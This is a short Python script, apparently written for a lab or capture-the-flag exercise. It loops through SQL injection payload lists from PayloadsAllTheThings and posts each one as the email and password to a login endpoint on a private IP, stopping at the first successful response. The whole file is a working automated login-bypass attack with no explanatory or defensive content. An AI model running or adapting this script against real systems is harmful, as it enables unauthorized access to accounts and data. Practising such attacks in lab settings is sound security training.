#!/usr/bin/python3
import requests
import json
import os

payloads_path = '/opt/PayloadsAllTheThings/SQL Injection/Intruder'
url = 'http://10.10.200.134/rest/user/login'
data = {'email': '', 'password': ''}

for filename in os.listdir(payloads_path):
    with open(payloads_path + '/' + filename, 'r') as payload_handle:
        try:
            lines = [line.replace('\n', '') for line in payload_handle.readlines()]
            for payload in lines:
                if type(payload) is not str:
                    continue
                print('[+] Trying payload\t--->\t' + payload)
                data['email'] = payload
                data['password'] = payload
                response = requests.post(url=url, data=json.dumps(data))
                if response.ok:
                    print('[*] Successfully found SQLi!!!')
                    print('[*] Triggering payload\t--->\t' + payload)
                    exit(0)
                else:
                    print('[-] Request failed\t--->\t' + str(response.status_code))
        except Exception as err:
            print('Error Occured\t--->\t' + str(err))
